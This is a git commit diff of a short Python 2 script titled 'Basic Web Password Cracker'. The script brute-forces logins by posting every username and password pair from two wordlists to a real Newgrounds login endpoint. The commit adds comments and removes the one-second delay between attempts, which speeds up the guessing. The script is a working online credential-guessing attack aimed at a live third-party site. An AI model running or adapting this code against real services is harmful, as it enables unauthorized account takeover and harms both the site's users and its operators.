117158906ba6edee08f156a3212994db59152f8f
Wayne Kenney <thehandoflinux@gmail.com>
2018-10-21 01:00:24 -0400

    Simple HTTP Cracker Structure

--- Reference/Simple HTTP Cracker Structure/cracker.py
+++ Reference/Simple HTTP Cracker Structure/cracker.py
@@ -1,26 +1,27 @@
 
+# Basic Web Password Cracker
+# Wayne Kenney / github.com/LogicPy
+
 import requests
 from time import sleep
 import sys
 
+# Global Variables
 url = "https://www.newgrounds.com/passport/mode/iframe/appsession/7df01f8afbcb51e3648973c934c5fd324e2fc904b5b7f8"
 userList = open('users.txt', 'r').read().split('\n')
 pwList = open('pw.txt', 'r').read().split('\n')
 
+# Login Function
 def login(username,password):
 
-	form_data = \
-	{
+	form_data = {
 		'username': username,
 		'password': password,
 		'remember':'1',
 		'login':'1'
 	}
 
-	header_data = \
-	{
-		
-	}
+	header_data = { }
 
 	r = requests.post(url,data=form_data,headers=header_data)
 
@@ -28,11 +29,13 @@ def login(username,password):
 
 	return check
 
+# Successful Authentication
 def cracked(username, password):
 	"\n password cracked (%s:%s) \n" % (username, password)
 	x = raw_input("\n Press ENTER to exit \n")
 	sys.exit()
 
+# Main Function
 def main():
 	global url
 	global userList
@@ -42,18 +45,12 @@ def main():
 
 	for user in userList:
 		for pw in pwList:
-
-			sleep(1)
-
 			print " %s:%s" % (user,pw)
-
 			out = login(user,pw)
-
 			if out == -1:
 				pass
 			else:
 				cracked(user,pw)
 
-
-
+# Call Main - Begin Cracking
 main()
